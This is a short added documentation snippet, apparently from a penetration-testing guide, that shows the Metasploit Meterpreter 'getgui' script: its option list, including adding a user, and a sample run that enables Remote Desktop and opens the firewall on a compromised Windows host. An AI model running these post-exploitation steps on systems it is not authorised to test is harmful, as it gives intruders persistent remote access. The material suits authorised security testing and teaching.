@@ -1,0 +1,27 @@
+The getgui script is used to enable RDP on a target system if it is disabled.
+
+meterpreter > run getgui
+
+[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
+[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
+Windows Remote Desktop Enabler Meterpreter Script
+Usage: getgui -u  -p
+Or:    getgui -e
+
+OPTIONS:
+
+    -e        Enable RDP only.
+    -f   Forward RDP Connection.
+    -h        Help menu.
+    -p   The Password of the user to add.
+    -u   The Username of the user to add.
+
+meterpreter > run getgui -e
+
+[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+[*] Carlos Perez carlos_perez@darkoperator.com
+[*] Enabling Remote Desktop
+[*] RDP is already enabled
+[*] Setting Terminal Services service startup mode
+[*] Terminal Services service is already set to auto
+[*] Opening port in local firewall if necessary
